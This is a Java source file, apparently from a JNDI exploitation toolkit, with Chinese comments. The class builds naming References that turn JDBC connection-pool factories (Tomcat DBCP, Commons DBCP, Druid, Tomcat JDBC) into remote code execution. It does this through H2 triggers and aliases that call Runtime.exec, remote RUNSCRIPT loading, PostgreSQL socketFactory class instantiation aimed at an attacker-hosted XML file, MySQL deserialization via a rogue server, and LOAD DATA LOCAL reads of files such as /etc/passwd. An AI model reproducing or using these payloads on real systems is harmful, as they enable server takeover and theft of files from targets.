package com.bloom.payload;

import javax.naming.Reference;
import javax.naming.StringRefAddr;

public class JDBCRce {

    // === 现有：各连接池工厂 + H2 JS Trigger ===

    public static Reference tomcat_dbcp2_RCE(String command){
        return dbcpByFactory("org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory",command);
    }
    public static Reference tomcat_dbcp1_RCE(String command){
        return dbcpByFactory("org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory",command);
    }
    public static Reference commons_dbcp2_RCE(String command){
        return dbcpByFactory("org.apache.commons.dbcp2.BasicDataSourceFactory",command);
    }
    public static Reference commons_dbcp1_RCE(String command){
        return dbcpByFactory("org.apache.commons.dbcp.BasicDataSourceFactory",command);
    }
    public static Reference druidjdbc(String command){
        return dbcpByFactory("com.alibaba.druid.pool.DruidDataSourceFactory",command);
    }
    public static Reference tomcatJDBC(String command){
        return dbcpByFactory("org.apache.tomcat.jdbc.pool.DataSourceFactory",command);
    }

    // === P2 新增：H2 多载体 ===

    /** H2 CREATE ALIAS：通过 Java 代码执行命令（不依赖 JS 引擎）。 */
    public static Reference h2_alias(String command) {
        String url = "jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT="
                + "CREATE ALIAS IF NOT EXISTS EXEC AS "
                + "'void exec(String cmd) throws Exception { Runtime.getRuntime().exec(cmd)\u003b}'\\;"
                + "CALL EXEC('" + command + "')";
        return dbcpByH2(url);
    }

    /** H2 RUNSCRIPT：远程加载 SQL 脚本（命令为远程 SQL 文件 URL）。 */
    public static Reference h2_runscript(String command) {
        String url = "jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT="
                + "RUNSCRIPT FROM '" + command + "'";
        return dbcpByH2(url);
    }

    /** H2 Groovy：通过 Groovy 脚本引擎执行（目标需有 Groovy）。 */
    public static Reference h2_groovy(String command) {
        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n"
                + "INFORMATION_SCHEMA.TABLES AS $$//groovy\n"
                + "\"" + command + "\".execute()\n"
                + "$$\n";
        return dbcpByH2(url);
    }

    // === P2 新增：PostgreSQL socketFactory ===

    /**
     * PostgreSQL socketFactory RCE：利用 PG JDBC 的 socketFactory 参数实例化任意类。
     * 命令格式：className#arg（如 org.springframework.context.support.ClassPathXmlApplicationContext#http://attacker/poc.xml）
     */
    public static Reference postgresql_socketFactory(String command) {
        String[] parts = command.split("#", 2);
        String className = parts[0];
        String arg = parts.length > 1 ? parts[1] : "";
        String url = "jdbc:postgresql://127.0.0.1:5432/test?socketFactory="
                + className + "&socketFactoryArg=" + arg;
        Reference ref = new Reference("javax.sql.DataSource",
                "org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory", null);
        ref.add(new StringRefAddr("driverClassName", "org.postgresql.Driver"));
        ref.add(new StringRefAddr("url", url));
        ref.add(new StringRefAddr("init", "true"));
        ref.add(new StringRefAddr("username", "test"));
        ref.add(new StringRefAddr("password", "test"));
        ref.add(new StringRefAddr("initialSize", "1"));
        return ref;
    }

    // === P2 新增：MySQL 反序列化 + 客户端文件读 ===

    /**
     * MySQL ServerStatusDiffInterceptor 反序列化：连接攻击者假 MySQL 服务器触发反序列化。
     * 命令格式：attacker_ip:port（假 MySQL 服务器地址）
     */
    public static Reference mysql_deserialize(String command) {
        String url = "jdbc:mysql://" + command
                + "/test?autoDeserialize=true"
                + "&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";
        Reference ref = new Reference("javax.sql.DataSource",
                "org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory", null);
        ref.add(new StringRefAddr("driverClassName", "com.mysql.cj.jdbc.Driver"));
        ref.add(new StringRefAddr("url", url));
        ref.add(new StringRefAddr("init", "true"));
        ref.add(new StringRefAddr("username", "test"));
        ref.add(new StringRefAddr("password", "test"));
        ref.add(new StringRefAddr("initialSize", "1"));
        return ref;
    }

    /**
     * MySQL 5.x detectCustomCollations 反序列化（旧版 MySQL Connector/J）。
     * 命令格式：attacker_ip:port
     */
    public static Reference mysql_deserialize5(String command) {
        String url = "jdbc:mysql://" + command
                + "/test?autoDeserialize=true"
                + "&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor";
        Reference ref = new Reference("javax.sql.DataSource",
                "org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory", null);
        ref.add(new StringRefAddr("driverClassName", "com.mysql.jdbc.Driver"));
        ref.add(new StringRefAddr("url", url));
        ref.add(new StringRefAddr("init", "true"));
        ref.add(new StringRefAddr("username", "test"));
        ref.add(new StringRefAddr("password", "test"));
        ref.add(new StringRefAddr("initialSize", "1"));
        return ref;
    }

    /**
     * MySQL 客户端文件读取（LOAD DATA LOCAL）：连接攻击者假 MySQL 服务器读取目标文件。
     * 命令格式：attacker_ip:port#/etc/passwd（服务器地址#目标文件路径）
     */
    public static Reference mysql_fileread(String command) {
        String[] parts = command.split("#", 2);
        String server = parts[0];
        String file = parts.length > 1 ? parts[1] : "/etc/passwd";
        String url = "jdbc:mysql://" + server
                + "/test?allowLoadLocalInfile=true"
                + "&allowUrlInLocalInfile=true"
                + "&maxAllowedPacket=655360";
        Reference ref = new Reference("javax.sql.DataSource",
                "org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory", null);
        ref.add(new StringRefAddr("driverClassName", "com.mysql.cj.jdbc.Driver"));
        ref.add(new StringRefAddr("url", url));
        ref.add(new StringRefAddr("init", "true"));
        ref.add(new StringRefAddr("username", "test"));
        ref.add(new StringRefAddr("password", "test"));
        ref.add(new StringRefAddr("initialSize", "1"));
        // 文件路径通过连接属性传递（假 MySQL 服务器在握手后发送 LOAD DATA LOCAL INFILE）
        ref.add(new StringRefAddr("connectionProperties", "file=" + file));
        return ref;
    }


    private static Reference dbcpByFactory(String factory,String command){
        String JDBC_URL = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
                "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
                "java.lang.Runtime.getRuntime().exec('"+ command +"')\n" +
                "$$\n";
        return dbcpRef(factory, "org.h2.Driver", JDBC_URL);
    }

    /** H2 URL 变体共用：默认走 Tomcat DBCP2 工厂。 */
    private static Reference dbcpByH2(String url) {
        return dbcpRef("org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory",
                "org.h2.Driver", url);
    }

    private static Reference dbcpRef(String factory, String driver, String url) {
        Reference ref = new Reference("javax.sql.DataSource", factory, null);
        ref.add(new StringRefAddr("driverClassName", driver));
        ref.add(new StringRefAddr("url", url));
        ref.add(new StringRefAddr("init", "true"));
        ref.add(new StringRefAddr("username", "root"));
        ref.add(new StringRefAddr("password", "password"));
        ref.add(new StringRefAddr("initialSize", "1"));
        return ref;
    }
}
